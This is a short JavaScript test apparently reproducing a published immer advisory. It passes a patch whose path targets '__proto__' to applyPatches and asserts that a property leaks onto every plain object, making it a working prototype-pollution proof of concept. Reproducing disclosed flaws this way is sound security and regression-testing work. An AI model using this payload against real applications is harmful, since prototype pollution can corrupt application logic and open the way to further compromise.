//https://snyk.io/vuln/SNYK-JS-IMMER-1019369
test("prototype pollution in immer", () => {
  expect({}.polluted).toBe(undefined);

  const { applyPatches, enablePatches } = require("immer");
  enablePatches();
  applyPatches({}, [
    { op: "add", path: ["__proto__", "polluted"], value: "yes" },
  ]);

  expect({}.polluted).toBe("yes");
});
